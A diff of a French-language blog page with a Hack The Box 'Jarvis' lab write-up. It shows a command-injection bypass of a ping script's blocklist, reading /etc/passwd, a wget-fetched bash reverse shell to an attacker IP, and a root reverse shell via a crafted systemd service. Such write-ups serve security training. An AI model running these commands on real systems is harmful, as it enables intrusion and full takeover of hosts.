+    month_dict <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Jan&#39;</span>:<span style="color:#e6db74">&#39;01&#39;</span>,<span style="color:#e6db74">&#39;Feb&#39;</span>:<span style="color:#e6db74">&#39;02&#39;</span>,<span style="color:#e6db74">&#39;Mar&#39;</span>:<span style="color:#e6db74">&#39;03&#39;</span>,<span style="color:#e6db74">&#39;Apr&#39;</span>:<span style="color:#e6db74">&#39;04&#39;</span>, <span style="color:#e6db74">&#39;May&#39;</span>:<span style="color:#e6db74">&#39;05&#39;</span>, <span style="color:#e6db74">&#39;Jun&#39;</span>:<span style="color:#e6db74">&#39;06&#39;</span>,<span style="color:#e6db74">&#39;Jul&#39;</span>:<span style="color:#e6db74">&#39;07&#39;</span>,<span style="color:#e6db74">&#39;Aug&#39;</span>:<span style="color:#e6db74">&#39;08&#39;</span>,<span style="color:#e6db74">&#39;Sep&#39;</span>:<span style="color:#e6db74">&#39;09&#39;</span>,<span style="color:#e6db74">&#39;Oct&#39;</span>:<span style="color:#e6db74">&#39;10&#39;</span>,<span style="color:#e6db74">&#39;Nov&#39;</span>:<span style="color:#e6db74">&#39;11&#39;</span>,<span style="color:#e6db74">&#39;Dec&#39;</span>:<span style="color:#e6db74">&#39;12&#39;</span>}
+    <span style="color:#66d9ef">return</span> month_dict[name]
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_max_level</span>(lines):
+    level<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> lines:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Level&#39;</span> <span style="color:#f92672">in</span> j:
+            <span style="color:#66d9ef">if</span> int(j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">&gt;</span> int(level):
+                level <span style="color:#f92672">=</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">4</span>]
+                req<span style="color:#f92672">=</span>j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">10</span>]
+    <span style="color:#66d9ef">return</span> level, req
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_ping</span>():
+    forbidden <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;||&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>]
+    command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter an IP: &#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> forbidden:
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> command:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Got you&#39;</span>)
             exit()
-    os.system('ping ' + command)
+    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ping &#39;</span> <span style="color:#f92672">+</span> command)
 
-if __name__ == '__main__':
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     show_header()
-    if len(sys.argv) != 2:
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
         show_help()
         exit()
-    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-h&#39;</span> <span style="color:#f92672">or</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;--help&#39;</span>:
         show_help()
         exit()
-    elif sys.argv[1] == '-s':
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-s&#39;</span>:
         show_statistics()
         exit()
-    elif sys.argv[1] == '-l':
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-l&#39;</span>:
         list_ip()
         exit()
-    elif sys.argv[1] == '-p':
+    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-p&#39;</span>:
         exec_ping()
         exit()
-    else:
+    <span style="color:#66d9ef">else</span>:
         show_help()
         exit()
 
-</code></pre>
-
-<p>On a donc :</p>
-
+</code></pre></div><p>On a donc :</p>
 <ul>
 <li>Une exécution de commande ;</li>
 <li>Lancée après un input utilisateur ;</li>
 <li>Par un script qui peut être lancé avec sudo ;</li>
 <li>Avec des droits utilisateurs (plus élevés), sans mot de passe.</li>
 </ul>
-
 <p>Mmh.. What could go wrong ? ¯\_(ツ)_/¯¯</p>
-
 <p>On se rend rapidement compte qu&rsquo;un petit filtre est en place. Après quelques tentatives, un bypass, tout aussi simple est trouvé et permet d&rsquo;exécuter la commande que l&rsquo;on souhaite, en déclenchant une erreur dans la commande ping exécutée.</p>
-
 <pre><code>$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ***********************************************
      _                 _                       
@@ -597,35 +571,23 @@ $(cat /etc/passwd)
 
 ping: sshd:x:107:65534::/run/sshd:/usr/sbin/nologin: Temporary failure in name resolution
 
-</code></pre>
-
-<p>Ainsi, on peut facilement construire un reverse shell, qui sera exécuté avec les droits de l&rsquo;utilisateur <code>pepper</code>.
+</code></pre><p>Ainsi, on peut facilement construire un reverse shell, qui sera exécuté avec les droits de l&rsquo;utilisateur <code>pepper</code>.
 Pour cette fois ci, plutôt que d&rsquo;exécuter directement une commande bash (notamment à cause des filtres) et puisque la machine dispose de l&rsquo;outil <code>wget</code>, j&rsquo;ai choisi d&rsquo;upload sur cette dernière un script bash exécutant mon reverse shell.</p>
-
 <p>A noter qu&rsquo;il est nécessaire d&rsquo;upload et modifier le fichier avec l&rsquo;injection de commandes afin que ce dernier dispose des bons droits d&rsquo;exécution et puisse donner un shell avec le bon utilisateur.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat pwn.sh                
+<span style="color:#75715e">#!/bin/bash -p</span>
 
-<pre><code class="language-bash">$ cat pwn.sh                
-#!/bin/bash -p
-
-bash -i &gt;&amp; /dev/tcp/10.10.13.221/4455 0&gt;&amp;1
-</code></pre>
-
-<pre><code>$(wget http://10.10.13.221:8000/pwn.sh)
+bash -i &gt;&amp; /dev/tcp/10.10.13.221/4455 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><pre><code>$(wget http://10.10.13.221:8000/pwn.sh)
 $(chmod +x pwn.sh)
 $(./pwn.sh)
-</code></pre>
-
-<pre><code>$ nc -lvvp 4455
+</code></pre><pre><code>$ nc -lvvp 4455
 listening on [any] 4455 ...
 10.10.10.143: inverse host lookup failed: Unknown host
 connect to [10.10.13.221] from (UNKNOWN) [10.10.10.143] 40742
 pepper@jarvis:/var/www/html$ 
-</code></pre>
-
-<h2 id="escalade-de-privilèges-via-systemctl">Escalade de privilèges via systemctl</h2>
-
+</code></pre><h2 id="escalade-de-privilèges-via-systemctl">Escalade de privilèges via systemctl</h2>
 <p>Une seconde phase d&rsquo;énumération et de recherche permet d&rsquo;identifier, au travers de LinEnum encore une fois, un binaire intéressant.</p>
-
 <pre><code>[-] SUID files:
 -rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
 -rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
@@ -642,28 +604,18 @@ pepper@jarvis:/var/www/html$
 -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
 -rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
 -rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-</code></pre>
-
-<p>En effet, il est possible pour tout membre du groupe <code>pepper</code> de lancer systemctl&hellip; Intéressant et anormal !
-Après quelques recherches, il s&rsquo;avère qu&rsquo;il semble possible de procéder à une escalade de privilège par ce biais (<a href="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a>).</p>
-
+</code></pre><p>En effet, il est possible pour tout membre du groupe <code>pepper</code> de lancer systemctl&hellip; Intéressant et anormal !
+Après quelques recherches, il s&rsquo;avère qu&rsquo;il semble possible de procéder à une escalade de privilège par ce biais (<a href="https://gtfobins.github.io/gtfobins/systemctl/)">https://gtfobins.github.io/gtfobins/systemctl/)</a>.</p>
 <p>Le binaire étant SUID, cela signifie que les services créés seront exécutés avec les droits root. On peut ainsi penser à créer nous même un service, suivant le lien ci-dessus, afin de récupérer un accès root à la machine.</p>
-
 <p>Let&rsquo;s craft !</p>
-
 <pre><code>echo '[Service]' &gt; /home/pepper/test.service
 echo 'Type=oneshot' &gt;&gt; /home/pepper/test.service
 echo 'ExecStart=/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.13.221/6677 0&gt;&amp;1&quot;' &gt;&gt; /home/pepper/test.service
 echo '[Install]' &gt;&gt; /home/pepper/test.service
 echo 'WantedBy=multi-user.target' &gt;&gt; /home/pepper/test.service
-</code></pre>
-
-<p>On va maintenant lier notre service à systemctl puis le démarrer. Ainsi l&rsquo;instruction <code>ExecStart</code> sera lancée au démarrage.</p>
-
+</code></pre><p>On va maintenant lier notre service à systemctl puis le démarrer. Ainsi l&rsquo;instruction <code>ExecStart</code> sera lancée au démarrage.</p>
 <p>NOTE 1 : Il est à noter que l&rsquo;exploitation ne peut se faire dans /tmp, probablement à cause d&rsquo;une option <code>noexec</code>. Ainsi, il est nécessaire de déplacer le service dans <code>/home/pepper</code>.</p>
-
 <p>NOTE 2 : Petit point qui m&rsquo;a fait tourner en rond, il est obligatoire de fournir le chemin absolu vers le service à systemctl&hellip; Pas de chemin relatif !</p>
-
 <pre><code>pepper@jarvis:~$ /bin/systemctl link /home/pepper/test.service
 /bin/systemctl link /home/pepper/test.service
 Created symlink /etc/systemd/system/test.service -&gt; /home/pepper/test.service.
@@ -671,10 +623,7 @@ Created symlink /etc/systemd/system/test.service -&gt; /home/pepper/test.service
 pepper@jarvis:~$ /bin/systemctl enable --now /home/pepper/test.service 
 /bin/systemctl enable --now /home/pepper/test.service
 Created symlink /etc/systemd/system/multi-user.target.wants/test.service -&gt; /home/pepper/test.service.
-</code></pre>
-
-<p>Le listener netcat en écoute, on récupère bien une connexion au lancement du service !</p>
-
+</code></pre><p>Le listener netcat en écoute, on récupère bien une connexion au lancement du service !</p>
 <pre><code>$ nc -lvvp 6677
 listening on [any] 6677 ...
 10.10.10.143: inverse host lookup failed: Unknown host
@@ -684,9 +633,7 @@ bash: no job control in this shell
 root@jarvis:/# id 
 id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-
-<p>w00ted !</p>
+</code></pre><p>w00ted !</p>
   </div>
   
 
@@ -724,7 +671,7 @@ uid=0(root) gid=0(root) groups=0(root)
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
